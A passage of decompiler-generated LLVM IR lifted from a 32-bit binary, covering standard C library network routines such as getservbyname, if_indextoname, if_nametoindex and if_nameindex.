  %v1_80652cf = icmp eq i32 %v5_80652c7, 0
  store i32 %v5_80652c7, i32* @esi, align 4
  br i1 %v1_80652cf, label %dec_label_pc_806526d, label %dec_label_pc_80652d5

dec_label_pc_80652d5:                             ; preds = %dec_label_pc_80652a8, %dec_label_pc_80652a4, %dec_label_pc_80652ba
  %v0_80652d5 = load i8, i8* @global_var_807e058.770, align 8
  %v1_80652d5 = icmp eq i8 %v0_80652d5, 0
  %v1_80652dc = icmp eq i1 %v1_80652d5, false
  br i1 %v1_80652dc, label %dec_label_pc_80652e3, label %dec_label_pc_80652de

dec_label_pc_80652de:                             ; preds = %dec_label_pc_80652d5
  %v0_80652de = call i32 @__GI_endservent()
  br label %dec_label_pc_80652e3

dec_label_pc_80652e3:                             ; preds = %dec_label_pc_80652d5, %dec_label_pc_80652de
  %v3_80652ec = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v1_80652f5 = inttoptr i32 %arg6 to i32*
  %v2_80652f5 = load i32, i32* %v1_80652f5, align 4
  %v3_80652f5 = icmp eq i32 %v2_80652f5, 0
  %v1_80652fd = icmp eq i1 %v3_80652f5, false
  %v2_80652fd = load i32, i32* @esi, align 4
  %v4_80652fd = select i1 %v1_80652fd, i32 0, i32 %v2_80652fd
  %v2_8065303 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8065303, i32* @ebx, align 4
  store i32 %v0_806522c, i32* @esi, align 4
  store i32 %v0_806522b, i32* @edi, align 4
  store i32 %v0_806522a, i32* @ebp, align 4
  ret i32 %v4_80652fd

; uselistorder directives
  uselistorder i32 %v2_806529c, { 1, 2, 0 }
  uselistorder i32 %v1_8065299, { 1, 0 }
  uselistorder i32 ()* @__GI_endservent, { 1, 0 }
  uselistorder i32 (i32)* @setservent, { 1, 0 }
  uselistorder i8* @global_var_807e058.770, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8075664.762 to i32), { 5, 0, 6, 1, 7, 2, 8, 3, 9, 10, 4 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_80652e3, { 1, 0 }
  uselistorder label %dec_label_pc_80652d5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80652ba, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8065286, { 1, 0 }
}

define i32 @getservbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_806530d = call i32 @__initbuf()
  %v2_8065314 = ptrtoint i32* %stack_var_-4 to i32
  %v0_806531e = load i32, i32* @global_var_807e040.761, align 64
  %v9_8065331 = call i32 @getservbyname_r(i32 %arg1, i32 %arg2, i32* nonnull @global_var_807e048.769, i32 %v0_806531e, i32 4237, i32 %v2_8065314, i32 %v0_806530d, i32 %v0_806530d)
  %v3_8065336 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8065336

; uselistorder directives
  uselistorder i32 (i32, i32, i32*, i32, i32, i32, i32, i32)* @getservbyname_r, { 1, 0 }
  uselistorder i32* @global_var_807e048.769, { 0, 2, 1 }
  uselistorder i32 ()* @__initbuf, { 2, 1, 0 }
}

define i32 @if_indextoname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8065340 = load i32, i32* @edi, align 4
  %v0_8065341 = load i32, i32* @esi, align 4
  %v0_8065342 = load i32, i32* @ebx, align 4
  %v12_8065343 = ptrtoint i32* %stack_var_-44 to i32
  %v3_8065346 = call i32 @__opensock(i32 %v0_8065342, i32 %v0_8065341, i32 %v0_8065340)
  store i32 %v3_8065346, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_806534f = icmp slt i32 %v3_8065346, 0
  br i1 %v2_806534f, label %dec_label_pc_80653b4, label %dec_label_pc_8065353

dec_label_pc_8065353:                             ; preds = %entry
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %v12_8065343, i32* @ebx, align 4
  store i32 %v3_8065346, i32* %stack_var_-60, align 4
  %v3_8065367 = call i32 @ioctl(i32 %v3_8065346, i32 35088, i32 %v12_8065343)
  store i32 %v3_8065367, i32* %eax.global-to-local, align 4
  %v2_806536f = icmp slt i32 %v3_8065367, 0
  %v1_8065371 = icmp eq i1 %v2_806536f, false
  br i1 %v1_8065371, label %dec_label_pc_8065399, label %dec_label_pc_8065373

dec_label_pc_8065373:                             ; preds = %dec_label_pc_8065353
  %v0_8065373 = load i32, i32* %stack_var_-60, align 4
  %v1_8065373 = call i32 @__errno_location(i32 %v0_8065373)
  store i32 %v1_8065373, i32* %eax.global-to-local, align 4
  %v1_806537b = inttoptr i32 %v1_8065373 to i32*
  %v2_806537b = load i32, i32* %v1_806537b, align 4
  store i32 %v2_806537b, i32* @ebx, align 4
  store i32 %v1_8065373, i32* @esi, align 4
  store i32 %v3_8065346, i32* %stack_var_-60, align 4
  %v1_8065380 = call i32 @__libc_close(i32 %v3_8065346)
  %v0_806538d = load i32, i32* @ebx, align 4
  %v9_806538d = icmp eq i32 %v0_806538d, 19
  %v3_8065390 = select i1 %v9_806538d, i32 6, i32 %v0_806538d
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8065395 = load i32, i32* @esi, align 4
  %v2_8065395 = inttoptr i32 %v1_8065395 to i32*
  store i32 %v3_8065390, i32* %v2_8065395, align 4
  %v0_80653ba.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80653b4

dec_label_pc_8065399:                             ; preds = %dec_label_pc_8065353
  store i32 %v3_8065346, i32* %stack_var_-60, align 4
  %v1_806539d = call i32 @__libc_close(i32 %v3_8065346)
  store i32 %v1_806539d, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v3_80653ac = inttoptr i32 %arg2 to i8*
  %v4_80653ac = call i32 @strncpy(i8* %v3_80653ac, i32 %v12_8065343, i32 16)
  store i32 %v4_80653ac, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80653b4

dec_label_pc_80653b4:                             ; preds = %entry, %dec_label_pc_8065373, %dec_label_pc_8065399
  %v0_80653ba = phi i32 [ 0, %entry ], [ %v0_80653ba.pre, %dec_label_pc_8065373 ], [ %v4_80653ac, %dec_label_pc_8065399 ]
  ret i32 %v0_80653ba

; uselistorder directives
  uselistorder i32 %v0_806538d, { 1, 0 }
  uselistorder i32 %v1_8065373, { 1, 0, 2 }
  uselistorder i32 %v3_8065346, { 6, 5, 1, 0, 3, 2, 4, 7 }
  uselistorder i32 %v12_8065343, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 0, 4 }
  uselistorder i32 19, { 0, 3, 1, 5, 4, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80653b4, { 2, 1, 0 }
}

define i32 @__GI_if_nametoindex() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80653bb = load i32, i32* @edi, align 4
  %v0_80653bc = load i32, i32* @esi, align 4
  %v0_80653bd = load i32, i32* @ebx, align 4
  store i32 %v0_80653bd, i32* %stack_var_-12, align 4
  %v12_80653be = ptrtoint i32* %stack_var_-44 to i32
  %v3_80653c1 = call i32 @__opensock(i32 %v0_80653bd, i32 %v0_80653bc, i32 %v0_80653bb)
  %v2_80653c6 = icmp slt i32 %v3_80653c1, 0
  store i32 %v3_80653c1, i32* @esi, align 4
  br i1 %v2_80653c6, label %dec_label_pc_8065427, label %dec_label_pc_80653cc

dec_label_pc_80653cc:                             ; preds = %entry
  store i32 %v12_80653be, i32* @ebx, align 4
  store i32 %v12_80653be, i32* %stack_var_-60, align 4
  %v3_80653d8 = bitcast i32* %stack_var_-44 to i8*
  %v4_80653d8 = call i32 @strncpy(i8* %v3_80653d8, i32 %tmp3, i32 16)
  %v0_80653e6 = load i32, i32* @esi, align 4
  store i32 %v0_80653e6, i32* %stack_var_-60, align 4
  %v3_80653e7 = call i32 @ioctl(i32 %v0_80653e6, i32 35123, i32 %v12_80653be)
  %v2_80653ef = icmp slt i32 %v3_80653e7, 0
  %v1_80653f1 = icmp eq i1 %v2_80653ef, false
  br i1 %v1_80653f1, label %dec_label_pc_8065415, label %dec_label_pc_80653f3

dec_label_pc_80653f3:                             ; preds = %dec_label_pc_80653cc
  %v0_80653f3 = load i32, i32* %stack_var_-60, align 4
  %v1_80653f3 = call i32 @__errno_location(i32 %v0_80653f3)
  %v1_80653fb = inttoptr i32 %v1_80653f3 to i32*
  %v2_80653fb = load i32, i32* %v1_80653fb, align 4
  store i32 %v2_80653fb, i32* @ebx, align 4
  store i32 %v1_80653f3, i32* @edi, align 4
  %v0_80653ff = load i32, i32* @esi, align 4
  store i32 %v0_80653ff, i32* %stack_var_-60, align 4
  %v1_8065400 = call i32 @__libc_close(i32 %v0_80653ff)
  %v0_8065408 = load i32, i32* @ebx, align 4
  %v9_8065408 = icmp eq i32 %v0_8065408, 22
  %v1_806540b = icmp eq i1 %v9_8065408, false
  br i1 %v1_806540b, label %dec_label_pc_8065427, label %dec_label_pc_806540d

dec_label_pc_806540d:                             ; preds = %dec_label_pc_80653f3
  %v0_806540d = load i32, i32* @edi, align 4
  %v1_806540d = inttoptr i32 %v0_806540d to i32*
  store i32 38, i32* %v1_806540d, align 4
  br label %dec_label_pc_8065427

dec_label_pc_8065415:                             ; preds = %dec_label_pc_80653cc
  %v0_8065418 = load i32, i32* @esi, align 4
  store i32 %v0_8065418, i32* %stack_var_-60, align 4
  %v1_8065419 = call i32 @__libc_close(i32 %v0_8065418)
  br label %dec_label_pc_8065429

dec_label_pc_8065427:                             ; preds = %dec_label_pc_80653f3, %entry, %dec_label_pc_806540d
  br label %dec_label_pc_8065429

dec_label_pc_8065429:                             ; preds = %dec_label_pc_8065415, %dec_label_pc_8065427
  %v0_806542f = phi i32 [ %tmp, %dec_label_pc_8065415 ], [ 0, %dec_label_pc_8065427 ]
  %v2_806542c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806542c, i32* @ebx, align 4
  store i32 %v0_80653bc, i32* @esi, align 4
  store i32 %v0_80653bb, i32* @edi, align 4
  ret i32 %v0_806542f

; uselistorder directives
  uselistorder i32 %v1_80653f3, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8065429, { 1, 0 }
  uselistorder label %dec_label_pc_8065427, { 2, 0, 1 }
}

define i32 @__GI_if_nameindex() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8065433 = load i32, i32* @edi, align 4
  %v0_8065434 = load i32, i32* @esi, align 4
  %v0_8065435 = load i32, i32* @ebx, align 4
  store i32 %v0_8065435, i32* %stack_var_-16, align 4
  %v3_8065439 = call i32 @__opensock(i32 %v0_8065435, i32 %v0_8065434, i32 %v0_8065433)
  store i32 %v3_8065439, i32* %eax.global-to-local, align 4
  %v2_8065445 = icmp slt i32 %v3_8065439, 0
  br i1 %v2_8065445, label %dec_label_pc_80655bf, label %dec_label_pc_8065450

dec_label_pc_8065450:                             ; preds = %entry
  %v2_806547d = ptrtoint i32* %stack_var_-24 to i32
  %v0_8065465.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806545c

dec_label_pc_806545c:                             ; preds = %dec_label_pc_806549b, %dec_label_pc_8065450
  %v0_8065465 = phi i32 [ %v0_8065465.pre, %dec_label_pc_8065450 ], [ %v1_8065494, %dec_label_pc_806549b ]
  %v0_8065476 = phi i32 [ 128, %dec_label_pc_8065450 ], [ %v1_806549e, %dec_label_pc_806549b ]
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_8065450 ], [ %v0_8065489, %dec_label_pc_806549b ]
  %v2_806545c = mul i32 %v0_8065476, 2
  %v1_806545f = add i32 %v2_806545c, 30
  %v1_8065462 = and i32 %v1_806545f, -16
  %v2_8065465 = sub i32 %v0_8065465, %v1_8065462
  %v1_8065467 = add i32 %v2_8065465, 15
  %v1_806546b = and i32 %v1_8065467, -16
  store i32 %v1_806546b, i32* %edx.global-to-local, align 4
  %v2_806546e = add i32 %v1_806546b, %v2_806545c
  store i32 %v2_806546e, i32* %eax.global-to-local, align 4
  %v15_8065471 = icmp eq i32 %v2_806546e, %stack_var_-20.0
  %v1_8065474 = icmp eq i1 %v15_8065471, false
  br i1 %v1_8065474, label %dec_label_pc_806547c, label %dec_label_pc_8065476

dec_label_pc_8065476:                             ; preds = %dec_label_pc_806545c
  %v2_8065476 = mul i32 %v0_8065476, 3
  br label %dec_label_pc_806547c

dec_label_pc_806547c:                             ; preds = %dec_label_pc_806545c, %dec_label_pc_8065476
  %storemerge = phi i32 [ %v2_8065476, %dec_label_pc_8065476 ], [ %v2_806545c, %dec_label_pc_806545c ]
  store i32 %storemerge, i32* @ebx, align 4
  %v2_806547c = add i32 %v2_8065465, -4
  %v3_806547c = inttoptr i32 %v2_806547c to i32*
  store i32 %v2_806546e, i32* %v3_806547c, align 4
  store i32 %v2_806547d, i32* %eax.global-to-local, align 4
  %v2_8065480 = add i32 %v2_8065465, -8
  %v3_8065480 = inttoptr i32 %v2_8065480 to i32*
  store i32 %v2_806547d, i32* %v3_8065480, align 4
  %v1_8065481 = add i32 %v2_8065465, -12
  %v2_8065481 = inttoptr i32 %v1_8065481 to i32*
  store i32 35090, i32* %v2_8065481, align 4
  %v5_8065486 = add i32 %v2_8065465, -16
  %v6_8065486 = inttoptr i32 %v5_8065486 to i32*
  store i32 %v3_8065439, i32* %v6_8065486, align 4
  %v0_8065489 = load i32, i32* %edx.global-to-local, align 4
  %v0_806548c = load i32, i32* @ebx, align 4
  store i32 %v0_806548c, i32* %stack_var_-24, align 4
  %v2_806548f = load i32, i32* %stack_var_-16, align 4
  %v3_806548f = call i32 @ioctl(i32 %v0_806548c, i32 %v0_8065489, i32 %v2_806548f)
  store i32 %v3_806548f, i32* %eax.global-to-local, align 4
  %v0_8065494 = load i32, i32* @esp, align 4
  %v2_8065497 = icmp slt i32 %v3_806548f, 0
  br i1 %v2_8065497, label %dec_label_pc_80654e3, label %dec_label_pc_806549b

dec_label_pc_806549b:                             ; preds = %dec_label_pc_806547c
  %v1_8065494 = add i32 %v0_8065494, 16
  %v3_806549b = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_806549b, i32* %eax.global-to-local, align 4
  %v1_806549e = load i32, i32* @ebx, align 4
  %v12_806549e = icmp eq i32 %v3_806549b, %v1_806549e
  br i1 %v12_806549e, label %dec_label_pc_806545c, label %dec_label_pc_80654a2

dec_label_pc_80654a2:                             ; preds = %dec_label_pc_806549b
  %v2_80654a2 = udiv i32 %v3_806549b, 32
  %v1_80654ab = mul nuw nsw i32 %v2_80654a2, 8
  %v2_80654ab = add nuw i32 %v1_80654ab, 8
  store i32 %v2_80654ab, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v3_80654b4 = inttoptr i32 %v0_8065494 to i32*
  store i32 %v2_80654ab, i32* %v3_80654b4, align 4
  %v1_80654b5 = call i32 @malloc(i32 %v2_80654a2)
  store i32 %v1_80654b5, i32* %eax.global-to-local, align 4
  %v0_80654ba = load i32, i32* @esp, align 4
  %v1_80654bd = icmp eq i32 %v1_80654b5, 0
  %v1_80654c2 = icmp eq i1 %v1_80654bd, false
  br i1 %v1_80654c2, label %dec_label_pc_8065595.preheader, label %dec_label_pc_80654c8

dec_label_pc_8065595.preheader:                   ; preds = %dec_label_pc_80654a2
  %v1_80654ba = add i32 %v0_80654ba, 16
  %v1_806550c = inttoptr i32 %v1_80654b5 to i8*
  %v0_806559531 = load i32, i32* @edi, align 4
  %v10_806559533 = icmp ult i32 %v0_806559531, %v2_80654a2
  br i1 %v10_806559533, label %dec_label_pc_80654fa, label %dec_label_pc_806559e

dec_label_pc_80654c8:                             ; preds = %dec_label_pc_80654a2
  %v6_80654cb = inttoptr i32 %v0_80654ba to i32*
  store i32 %v3_8065439, i32* %v6_80654cb, align 4
  %v1_80654ce = call i32 @__libc_close(i32 %v1_80654b5)
  store i32 %v1_80654ce, i32* %eax.global-to-local, align 4
  %v1_80654d3 = call i32 @__errno_location(i32 %v1_80654b5)
  store i32 %v1_80654d3, i32* %eax.global-to-local, align 4
  %v1_80654d8 = inttoptr i32 %v1_80654d3 to i32*
  store i32 105, i32* %v1_80654d8, align 4
  br label %dec_label_pc_80655bc

dec_label_pc_80654e3:                             ; preds = %dec_label_pc_806547c
  %v6_80654e6 = inttoptr i32 %v0_8065494 to i32*
  store i32 %v3_8065439, i32* %v6_80654e6, align 4
  %v1_80654e9 = call i32 @__libc_close(i32 0)
  store i32 %v1_80654e9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80655bc

dec_label_pc_80654fa:                             ; preds = %dec_label_pc_806558f, %dec_label_pc_8065595.preheader
  %v0_80654ff = phi i32 [ %v1_80654ba, %dec_label_pc_8065595.preheader ], [ %v0_80654ff.pre, %dec_label_pc_806558f ]
  %v0_806559539 = phi i32 [ %v0_806559531, %dec_label_pc_8065595.preheader ], [ %v0_8065595, %dec_label_pc_806558f ]
  store i32 %v1_80654b5, i32* %eax.global-to-local, align 4
  %v2_8065502 = mul i32 %v0_806559539, 32
  %v5_8065505 = add i32 %v2_8065502, %v0_8065489
  store i32 %v5_8065505, i32* @ebx, align 4
  %v2_8065508 = mul i32 %v0_806559539, 8
  %v3_8065508 = add i32 %v2_8065508, %v1_80654b5
  store i32 %v3_8065508, i32* @esi, align 4
  %v2_806550b = add i32 %v0_80654ff, -16
  %v3_806550b = inttoptr i32 %v2_806550b to i32*
  store i32 %v5_8065505, i32* %v3_806550b, align 4
  %v2_806550c = call i32 @__GI_strdup(i8* %v1_806550c)
  store i32 %v2_806550c, i32* %eax.global-to-local, align 4
  %v1_8065514 = icmp eq i32 %v2_806550c, 0
  %v1_8065516 = load i32, i32* @esi, align 4
  %v2_8065516 = add i32 %v1_8065516, 4
  %v3_8065516 = inttoptr i32 %v2_8065516 to i32*
  store i32 %v2_806550c, i32* %v3_8065516, align 4
  br i1 %v1_8065514, label %dec_label_pc_8065531, label %dec_label_pc_806551b

dec_label_pc_806551b:                             ; preds = %dec_label_pc_80654fa
  %v1_806551b = load i32, i32* @esp, align 4
  %v2_806551b = add i32 %v1_806551b, -4
  %v3_806551b = inttoptr i32 %v2_806551b to i32*
  store i32 %v2_806550c, i32* %v3_806551b, align 4
  %v0_806551c = load i32, i32* @ebx, align 4
  %v2_806551c = add i32 %v1_806551b, -8
  %v3_806551c = inttoptr i32 %v2_806551c to i32*
  store i32 %v0_806551c, i32* %v3_806551c, align 4
  %v1_806551d = add i32 %v1_806551b, -12
  %v2_806551d = inttoptr i32 %v1_806551d to i32*
  store i32 35123, i32* %v2_806551d, align 4
  %v5_8065522 = add i32 %v1_806551b, -16
  %v6_8065522 = inttoptr i32 %v5_8065522 to i32*
  store i32 %v3_8065439, i32* %v6_8065522, align 4
  %v3_8065525 = call i32 @ioctl(i32 %v1_80654b5, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8065525, i32* %eax.global-to-local, align 4
  %v2_806552d = icmp slt i32 %v3_8065525, 0
  %v1_806552f = icmp eq i1 %v2_806552d, false
  br i1 %v1_806552f, label %dec_label_pc_806558f, label %dec_label_pc_8065531

dec_label_pc_8065531:                             ; preds = %dec_label_pc_806551b, %dec_label_pc_80654fa
  %v1_8065531 = call i32 @__errno_location(i32 %v1_80654b5)
  store i32 %v1_8065531, i32* %eax.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_806553b = inttoptr i32 %v1_8065531 to i32*
  %v2_806553b = load i32, i32* %v1_806553b, align 4
  store i32 %v2_806553b, i32* @ebx, align 4
  %v1_806555223 = load i32, i32* @edi, align 4
  %v7_806555225 = icmp eq i32 %v1_806555223, 0
  br i1 %v7_806555225, label %dec_label_pc_8065531.dec_label_pc_8065556_crit_edge, label %dec_label_pc_806553f.lr.ph

dec_label_pc_8065531.dec_label_pc_8065556_crit_edge: ; preds = %dec_label_pc_8065531
  %v0_8065556.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065556

dec_label_pc_806553f.lr.ph:                       ; preds = %dec_label_pc_8065531
  %v3_8065545 = add i32 %v1_80654b5, 4
  %v0_8065542.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806553f

dec_label_pc_806553f:                             ; preds = %dec_label_pc_806553f.lr.ph, %dec_label_pc_806553f
  %v0_8065542 = phi i32 [ %v0_8065542.pre, %dec_label_pc_806553f.lr.ph ], [ %v1_806554f, %dec_label_pc_806553f ]
  %v1_806554530 = phi i32 [ 0, %dec_label_pc_806553f.lr.ph ], [ %v0_8065552.pre, %dec_label_pc_806553f ]
  store i32 %v1_80654b5, i32* %edx.global-to-local, align 4
  %v2_8065545 = mul i32 %v1_806554530, 8
  %v4_8065545 = add i32 %v3_8065545, %v2_8065545
  %v5_8065545 = inttoptr i32 %v4_8065545 to i32*
  %v6_8065545 = load i32, i32* %v5_8065545, align 4
  %v8_8065545 = add i32 %v0_8065542, -16
  %v9_8065545 = inttoptr i32 %v8_8065545 to i32*
  store i32 %v6_8065545, i32* %v9_8065545, align 4
  %v0_8065549 = load i32, i32* @esi, align 4
  %v1_8065549 = add i32 %v0_8065549, 1
  store i32 %v1_8065549, i32* @esi, align 4
  %v1_806554a = call i32 @free(i32 %v1_8065531)
  store i32 %v1_806554a, i32* %eax.global-to-local, align 4
  %v0_806554f = load i32, i32* @esp, align 4
  %v1_806554f = add i32 %v0_806554f, 16
  %v0_8065552.pre = load i32, i32* @esi, align 4
  %v1_8065552 = load i32, i32* @edi, align 4
  %v7_8065552 = icmp ult i32 %v0_8065552.pre, %v1_8065552
  br i1 %v7_8065552, label %dec_label_pc_806553f, label %dec_label_pc_8065556

dec_label_pc_8065556:                             ; preds = %dec_label_pc_806553f, %dec_label_pc_8065531.dec_label_pc_8065556_crit_edge
  %v0_8065556 = phi i32 [ %v0_8065556.pre, %dec_label_pc_8065531.dec_label_pc_8065556_crit_edge ], [ %v1_806554f, %dec_label_pc_806553f ]
  %v5_8065559 = add i32 %v0_8065556, -16
  %v6_8065559 = inttoptr i32 %v5_8065559 to i32*
  store i32 %v1_80654b5, i32* %v6_8065559, align 4
  %v1_806555c = call i32 @free(i32 %v1_8065531)
  store i32 %v1_806555c, i32* %eax.global-to-local, align 4
  %v0_8065561 = load i32, i32* @esp, align 4
  %v1_8065561 = inttoptr i32 %v0_8065561 to i32*
  %v2_8065561 = load i32, i32* %v1_8065561, align 4
  store i32 %v2_8065561, i32* @ecx, align 4
  store i32 %v3_8065439, i32* %v1_8065561, align 4
  %v1_8065565 = call i32 @__libc_close(i32 %v1_8065531)
  store i32 %v1_8065565, i32* %eax.global-to-local, align 4
  %v0_806556d = load i32, i32* @ebx, align 4
  %v9_806556d = icmp eq i32 %v0_806556d, 22
  %v1_8065570 = icmp eq i1 %v9_806556d, false
  br i1 %v1_8065570, label %dec_label_pc_8065576, label %dec_label_pc_8065572

dec_label_pc_8065572:                             ; preds = %dec_label_pc_8065556
  %v1_8065572 = and i32 %v0_806556d, -256
  %v2_8065572 = or i32 %v1_8065572, 38
  br label %dec_label_pc_8065581

dec_label_pc_8065576:                             ; preds = %dec_label_pc_8065556
  %v9_8065576 = icmp eq i32 %v0_806556d, 12
  store i32 105, i32* %eax.global-to-local, align 4
  %v3_806557e = select i1 %v9_8065576, i32 105, i32 %v0_806556d
  br label %dec_label_pc_8065581

dec_label_pc_8065581:                             ; preds = %dec_label_pc_8065572, %dec_label_pc_8065576
  %storemerge1 = phi i32 [ %v2_8065572, %dec_label_pc_8065572 ], [ %v3_806557e, %dec_label_pc_8065576 ]
  store i32 %v1_8065531, i32* %eax.global-to-local, align 4
  store i32 %storemerge1, i32* %v1_806553b, align 4
  br label %dec_label_pc_80655bf

dec_label_pc_806558f:                             ; preds = %dec_label_pc_806551b
  %v0_806558f = load i32, i32* @ebx, align 4
  %v1_806558f = add i32 %v0_806558f, 16
  %v2_806558f = inttoptr i32 %v1_806558f to i32*
  %v3_806558f = load i32, i32* %v2_806558f, align 4
  store i32 %v3_806558f, i32* %eax.global-to-local, align 4
  %v0_8065592 = load i32, i32* @edi, align 4
  %v1_8065592 = add i32 %v0_8065592, 1
  store i32 %v1_8065592, i32* @edi, align 4
  %v1_8065593 = load i32, i32* @esi, align 4
  %v2_8065593 = inttoptr i32 %v1_8065593 to i32*
  store i32 %v3_806558f, i32* %v2_8065593, align 4
  %v0_8065595 = load i32, i32* @edi, align 4
  %v10_8065595 = icmp ult i32 %v0_8065595, %v2_80654a2
  %v0_80654ff.pre = load i32, i32* @esp, align 4
  br i1 %v10_8065595, label %dec_label_pc_80654fa, label %dec_label_pc_806559e

dec_label_pc_806559e:                             ; preds = %dec_label_pc_806558f, %dec_label_pc_8065595.preheader
  %v0_8065595.lcssa = phi i32 [ %v0_806559531, %dec_label_pc_8065595.preheader ], [ %v0_8065595, %dec_label_pc_806558f ]
  store i32 %v1_80654b5, i32* %edx.global-to-local, align 4
  %v2_80655a4 = mul i32 %v0_8065595.lcssa, 8
  %v3_80655a4 = add i32 %v2_80655a4, %v1_80654b5
  store i32 %v3_80655a4, i32* %eax.global-to-local, align 4
  %v1_80655a7 = inttoptr i32 %v3_80655a4 to i32*
  store i32 0, i32* %v1_80655a7, align 4
  %v0_80655ad = load i32, i32* %eax.global-to-local, align 4
  %v1_80655ad = add i32 %v0_80655ad, 4
  %v2_80655ad = inttoptr i32 %v1_80655ad to i32*
  store i32 0, i32* %v2_80655ad, align 4
  %v4_80655b4 = load i32, i32* @esp, align 4
  %v5_80655b4 = add i32 %v4_80655b4, -4
  %v6_80655b4 = inttoptr i32 %v5_80655b4 to i32*
  store i32 %v3_8065439, i32* %v6_80655b4, align 4
  %v1_80655b7 = call i32 @__libc_close(i32 %v1_80654b5)
  store i32 %v1_80655b7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80655bc

dec_label_pc_80655bc:                             ; preds = %dec_label_pc_80654e3, %dec_label_pc_80654c8, %dec_label_pc_806559e
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_80654e3 ], [ %v1_80654b5, %dec_label_pc_806559e ], [ %v1_80654b5, %dec_label_pc_80654c8 ]
  br label %dec_label_pc_80655bf

dec_label_pc_80655bf:                             ; preds = %entry, %dec_label_pc_8065581, %dec_label_pc_80655bc
  %stack_var_-36.1 = phi i32 [ 0, %entry ], [ %stack_var_-36.0, %dec_label_pc_80655bc ], [ 0, %dec_label_pc_8065581 ]
  store i32 %stack_var_-36.1, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-36.1

; uselistorder directives
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %v0_8065595, { 0, 2, 1 }
  uselistorder i32 %v0_806556d, { 2, 0, 3, 1 }
  uselistorder i32 %v2_806550c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_806559539, { 1, 0 }
  uselistorder i32 %v1_80654b5, { 3, 6, 7, 0, 8, 10, 11, 2, 12, 9, 1, 14, 5, 4, 13, 15, 16 }
  uselistorder i32 %v2_80654a2, { 0, 3, 1, 2 }
  uselistorder i32 %v3_806549b, { 1, 0, 2 }
  uselistorder i32 %v0_8065489, { 0, 2, 1 }
  uselistorder i32 %v2_806546e, { 1, 0, 2 }
  uselistorder i32 %v2_8065465, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_806545c, { 1, 2, 0 }
  uselistorder i32 %v0_8065476, { 1, 0 }
  uselistorder i32 %v3_8065439, { 1, 3, 2, 4, 0, 5, 6, 7 }
  uselistorder i32 38, { 5, 6, 4, 11, 0, 1, 7, 8, 9, 10, 2, 3 }
  uselistorder i32 35123, { 1, 0 }
  uselistorder i32 105, { 1, 3, 4, 2, 0 }
  uselistorder i32 30, { 22, 23, 17, 2, 18, 19, 20, 21, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 14, 15, 16, 1 }
  uselistorder i32 (i32, i32, i32)* @__opensock, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80655bf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80655bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065581, { 1, 0 }
  uselistorder label %dec_label_pc_806553f, { 1, 0 }
  uselistorder label %dec_label_pc_806547c, { 1, 0 }
}

define i32 @__GI_if_freenameindex(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_80655ca = load i32, i32* @esi, align 4
  %v0_80655cb = load i32, i32* @ebx, align 4
  store i32 %v0_80655cb, i32* %stack_var_-8, align 4
  store i32 %tmp3, i32* @esi, align 4
  br label %dec_label_pc_80655e6

dec_label_pc_80655d7:                             ; preds = %dec_label_pc_80655ed, %dec_label_pc_80655e6
  %v1_80655da = add i32 %v0_80655da, 8
  store i32 %v1_80655da, i32* @ebx, align 4
  %v1_80655de = call i32 @free(i32 %v3_80655e6)
  %v0_80655e6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80655e6

dec_label_pc_80655e6:                             ; preds = %entry, %dec_label_pc_80655d7
